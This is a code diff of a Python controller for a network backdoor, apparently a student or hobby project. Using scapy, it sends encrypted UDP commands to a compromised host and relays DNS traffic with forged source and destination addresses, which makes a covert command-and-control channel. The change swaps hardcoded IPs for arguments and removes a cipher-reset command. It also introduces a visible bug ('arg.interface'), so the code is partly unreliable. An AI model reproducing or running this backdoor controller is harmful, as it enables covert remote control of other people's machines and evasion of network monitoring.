@@ -9,9 +9,16 @@ from sys import exit
 
 # Command Line Arguments
 parser = argparse.ArgumentParser("./main.py")
-parser.add_argument("dst_host", help="The destination host. IPv4 Only.")
-parser.add_argument("src_host", help="The source host. IPv4 Only.")
+parser.add_argument("controller_ip", help="The IPv4 address of the controller host")
+parser.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
+parser.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 args = parser.parse_args()
+
+# Validate Arguments
+
+CONTROLLER_IP = args.controller_ip
+BACKDOOR_IP = args.backdoor_ip
+NETWORK_INTERFACE = arg.interface
 
 queue = SimpleQueue()
 
@@ -20,7 +27,6 @@ encryption_handler = StreamEncryption()
 encryption_handler.read_nonce("data/nonce.bin")
 encryption_handler.read_secret("data/secret.key")
 encryption_handler.initialize_encryption_context()
-print()
 
 def subprocess_packet_handler(pkt):
     if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
@@ -34,14 +40,14 @@ def subprocess_packet_handler(pkt):
     # 4. sr1 the DNS query to a legit DNS server.
     response = sr1(forged, verbose=0)
     # 5. send the response back to the backdoor machine.
-    response[IP].src = "10.0.0.159"
-    response[IP].dst = "10.0.0.131"
+    response[IP].src = f"{CONTROLLER_IP}"
+    response[IP].dst = f"{BACKDOOR_IP}"
     send(response, verbose=0)
 
 def subprocess_start():
-    sniff(filter="ip src host 10.0.0.131 and not port ssh and udp and not icmp", iface="enp2s0", prn=subprocess_packet_handler)
+    sniff(filter=f"ip src host {BACKDOOR_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)
 
-def send_udp(victim_ip: str, data: str):
+def send_udp(data: str):
     """
         Sends a UDP packet to the backdoor which is supposed to contain a command. 
         All commands get sent to a specific UDP port on the backdoor machine. 
@@ -49,20 +55,17 @@ def send_udp(victim_ip: str, data: str):
         section. The backdoor machine listens for a specific port to know that 
         the UDP packet is ours.
     """
+    data = data.encode("utf-8")
     # Encrypt the data.
-    encrypted_data = encryption_handler.encrypt(data.encode('utf-8'))
+    data = encryption_handler.encrypt(data)
     # Forge the UDP packet.
-    pkt = IP(src="10.0.0.159", dst=victim_ip)/UDP(sport=10069, dport=10420, len=len(encrypted_data))
-    pkt[UDP].payload = Raw(encrypted_data)
+    pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{BACKDOOR_IP}")/UDP(sport=10069, dport=10420, len=len(data))
+    pkt[UDP].payload = Raw(data)
     # Send the packet.
     send(pkt, verbose=0)
 
 def list_files():
     pass
-
-def cipher_reset():
-    print("Resetting backdoor cipher...")
-    send_udp("10.0.0.131", CIPHER_RESET)
 
 if __name__ == "__main__":
 
@@ -95,7 +98,7 @@ if __name__ == "__main__":
                 file_path = args[1]
                 data = args[0] + " " + args[1]
                 # Send the command to backdoor.
-                send_udp("10.0.0.131", data)
+                send_udp(data)
                 # Receive the response.
                 encrypted = None
                 while True:
@@ -106,8 +109,6 @@ if __name__ == "__main__":
                 decrypted = encryption_handler.decrypt(encrypted)
                 print(f"Response: {decrypted.decode('utf-8')}")
                 continue
-            if args[0] == CIPHER and args[1] == RESET:
-                cipher_reset()
         else:
             print(f"Command not found: {command}")
     decode_process.kill()
